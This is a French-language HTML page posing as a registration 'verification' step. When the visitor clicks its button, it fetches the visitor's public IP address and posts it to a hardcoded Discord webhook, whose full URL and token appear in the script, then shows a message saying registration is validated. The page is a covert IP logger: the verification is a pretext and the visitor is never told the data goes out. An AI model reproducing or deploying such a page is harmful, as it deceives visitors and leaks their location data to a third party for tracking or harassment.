<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: black;
        }
        #container {
            text-align: center;
            padding: 20px;
            border: 1px solid #ddd;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        h1 {
            font-size: 20px;
            color: #333;
        }
        #result {
            margin-top: 15px;
            font-size: 14px;
            color: #555;
        }
        button {
            padding: 10px;
            width: 100%;
            border: none;
            border-radius: 4px;
            background-color: #007bff;
            color: white;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div id="container">
        <h1>Vérification</h1>
        <button onclick="checkIP()">Vérifier et valider l'inscription</button>
        <div id="result"></div>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1305558117420892241/X3TC44x8aZrxgYD71reZpHIZThzShBhBRhiet7w6K6Uq7oQya9xcGPaPdm3KIC4AZh2K";

        function checkIP() {
            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip;

                    const message = {
                        content: `Nouvelle vérification : \n**IP**: ${userIP}`
                    };

                    fetch(webhookURL, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(message)
                    })
                    .then(() => {
                        document.getElementById("result").innerText = "IP vérifiée et inscription validée !";
                    })
                    .catch(error => {
                        console.error("Erreur lors de l'envoi au webhook:", error);
                        document.getElementById("result").innerText = "Erreur lors de la validation.";
                    });
                })
                .catch(error => {
                    document.getElementById("result").innerText = "Erreur lors de la récupération de l'IP.";
                    console.error("Erreur:", error);
                });
        }
    </script>
</body>
</html>
